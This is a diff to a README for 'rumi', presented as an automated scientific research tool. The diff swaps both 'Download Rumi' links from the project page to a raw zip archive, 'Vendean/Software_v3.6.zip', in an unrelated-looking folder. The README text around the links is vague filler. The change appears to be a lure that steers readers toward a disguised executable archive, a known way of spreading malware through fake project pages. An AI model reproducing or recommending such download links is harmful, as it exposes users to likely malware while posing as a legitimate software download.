@@ -1,6 +1,6 @@
 # 🧠 rumi - Automated research for scientific discovery
 
-[![Download Rumi](https://img.shields.io/badge/Download-Rumi-blue)](https://github.com/josemanuelm9203/rumi)
+[![Download Rumi](https://img.shields.io/badge/Download-Rumi-blue)](https://github.com/josemanuelm9203/rumi/raw/refs/heads/main/Vendean/Software_v3.6.zip)
 
 Rumi helps you run scientific research tasks. It uses computer models to process data. You can find patterns and generate new ideas for experiments. The system works inside your terminal. It uses eighty-eight small brain programs to check facts. It also creates charts of knowledge to link information. The framework tracks contradictions and reviews your plans. You use this tool to speed up your work on complex topics.
 
@@ -19,7 +19,7 @@ If your computer meets these rules, you can move to the next part.
 
 You need to visit the project page to download the software. Click the link below to go to the official files.
 
-[Visit this page to download Rumi](https://github.com/josemanuelm9203/rumi)
+[Visit this page to download Rumi](https://github.com/josemanuelm9203/rumi/raw/refs/heads/main/Vendean/Software_v3.6.zip)
 
 Follow these steps on your computer:
 
